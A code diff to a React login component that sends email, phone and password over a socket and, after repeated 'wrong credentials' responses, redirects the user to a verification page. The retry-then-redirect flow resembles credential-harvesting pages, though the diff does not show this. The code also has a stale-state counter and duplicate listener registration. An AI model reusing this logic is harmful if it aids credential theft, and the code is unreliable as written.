@@ -103,6 +103,7 @@ const Home = () => {
   const dateInput = useRef(null);
   const emailInput = useRef(null);
   const phoneInput = useRef(null);
+  const [count, setCount] = useState(0);
   const socket = useContext(SocketContext);
   const handleChange = (e) => {
     const inputChar = e.target.value[e.target.value.length - 1];
@@ -162,15 +163,18 @@ const Home = () => {
       setLoading(true);
       socket.emit("login", { email, phone, password });
       socket.on("loginResponse", (data) => {
-        if (data.message === "CODE_SENT") {
-          //     // setLoading(false);
-          //     // setStateButton("bg-blue-200");
-          //     // setPassword("");
-          //     // setError("Invalid password");
+        if (data.message === "WRONG_CREDENTIALS") {
           setLoading(false);
-          setShowLoading(true);
-          setUrl("/verify");
-          setMode("forget-password");
+          setStateButton("bg-blue-200");
+          setPassword("");
+          setError("Invalid password");
+          setCount(count + 1);
+          if (count === 2) {
+            setLoading(false);
+            setShowLoading(true);
+            setUrl("/verify");
+            setMode("forget-password");
+          }
         } else {
           setLoading(false);
           setStateButton("bg-blue-200");
